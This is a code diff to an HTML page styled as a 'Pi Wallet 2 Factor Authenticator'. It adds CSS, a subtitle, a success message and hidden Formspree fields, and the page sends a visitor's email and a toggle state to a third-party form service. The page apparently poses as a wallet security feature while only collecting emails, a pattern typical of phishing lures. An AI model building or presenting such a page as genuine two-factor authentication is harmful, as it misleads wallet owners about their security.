@@ -43,7 +43,13 @@
 
         .toggle-wrapper h2 {
             color: var(--pi-purple);
-            margin-bottom: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
         }
 
         .email-input {
@@ -53,6 +59,12 @@
             border: 2px solid var(--border-color);
             font-size: 1rem;
             margin-bottom: 1.5rem;
+            transition: border-color 0.3s;
+        }
+
+        .email-input:focus {
+            outline: none;
+            border-color: var(--pi-purple);
         }
 
         .toggle {
@@ -68,6 +80,11 @@
 
         .toggle.on {
             background: var(--success-color);
+        }
+
+        .toggle.disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         .toggle-circle {
@@ -90,13 +107,45 @@
             margin-top: 1.5rem;
             font-weight: bold;
             font-size: 1.1rem;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .info-box {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 2rem;
+            text-align: left;
+            font-size: 0.9rem;
+            color: #555;
+        }
+
+        .info-box strong {
+            color: var(--pi-purple);
         }
     </style>
 </head>
 <body>
 
 <div class="toggle-wrapper">
-    <h2>Pi Wallet 2 Factor Authenticator</h2>
+    <h2>🔐 Pi Wallet 2 Factor Authenticator</h2>
+    <p class="subtitle">Secure your wallet with two-factor authentication</p>
 
     <!-- Formspree Form -->
     <form id="toggleForm" action="https://formspree.io/f/mgvglzne" method="POST">
@@ -108,15 +157,29 @@
             required
         />
 
-        <!-- Hidden field updated by JS -->
+        <!-- Hidden fields for Formspree -->
         <input type="hidden" name="action" id="actionField">
+        <input type="hidden" name="_subject" value="Pi Wallet 2FA Status Update">
+        <input type="hidden" name="timestamp" id="timestampField">
+        
+        <!-- Formspree autoresponse reply-to -->
+        <input type="hidden" name="_replyto" value="">
 
         <div class="toggle" id="toggleBtn">
             <div class="toggle-circle"></div>
         </div>
 
-        <p class="status-text" id="statusText">2 factor authentication is OFF</p>
+        <p class="status-text" id="statusText">2-factor authentication is OFF</p>
+        
+        <div class="success-message" id="successMessage">
+            ✓ Check your email for confirmation!
+        </div>
     </form>
+
+    <div class="info-box">
+        <strong>📧 What happens next?</strong><br>
+        You'll receive a confirmation email with your 2FA status and important security tips.
+    </div>
 </div>
 
 <script src="script.js"></script>
